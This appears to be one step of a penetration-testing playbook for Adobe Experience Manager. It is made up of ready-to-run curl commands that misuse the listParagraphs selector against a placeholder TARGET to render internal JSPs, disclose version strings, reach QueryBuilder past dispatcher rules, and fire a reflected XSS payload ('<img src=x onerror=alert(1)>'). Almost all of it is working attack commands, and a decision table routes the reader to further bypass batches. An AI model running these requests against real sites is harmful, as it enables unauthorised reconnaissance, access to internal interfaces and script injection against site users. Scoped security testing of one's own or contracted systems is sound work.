# Batch 10 — Selector gadget: `listParagraphs`

## objective

Use `listParagraphs` to (1) fingerprint version via internal about JSP, (2) reach internal resource types, (3) test the known XSS `path=` sink — **without** chaining `form` yet.

## estimated_time

60–90 minutes

## prerequisites

- `PAGE` that is a real page (`cq:Page`)
- XSS only if in scope

## testing_workflow

### 1) Technique A — version / about render

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

curl -sk -o /tmp/lp.html -w "%{http_code} %{size_download}\n" \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
head -c 600 /tmp/lp.html; echo
```

Look for version/build strings.

### 2) Technique B — point at statistics JSP (XSS historical)

```bash
curl -sk -o /tmp/lp.html -w "%{http_code}\n" \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=aemxssmarker"
grep -n 'aemxssmarker' /tmp/lp.html | head
```

```bash
# If marker reflects raw:
curl -sk -o /tmp/lp.html \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=%3Cimg%20src=x%20onerror=alert(1)%3E"
grep -i onerror /tmp/lp.html | head
```

### 3) Technique C — itemResourceType toward QueryBuilder-ish surfaces

```bash
curl -sk -o /tmp/lp.out -w "%{http_code} %{size_download}\n" \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/bin/querybuilder.json&limit=1"
head -c 400 /tmp/lp.out; echo
```

If this returns useful data while `/bin/querybuilder.json` is 404 → strong internal-invoke finding.

Try a second page only if first returns blank errors.

## decision_points

| If… | Then… |
|-----|--------|
| Internal render works | Document; go **11** to bypass dispatcher blocks on this selector |
| XSS works | PoC + **11** optional |
| Fully dead | Skip **11** or do **11** only if `form` worked in batch 06; else **12** |

## expected_findings

- Dispatcher-independent access to `/libs` renderers  
- Version disclosure, XSS, secondary path to query interfaces  

## next_batch_to_continue_with

→ **[11-selector-chains.md](./11-selector-chains.md)**  
If no selector interest and Forms flagged → **[12-forms-surface.md](./12-forms-surface.md)**
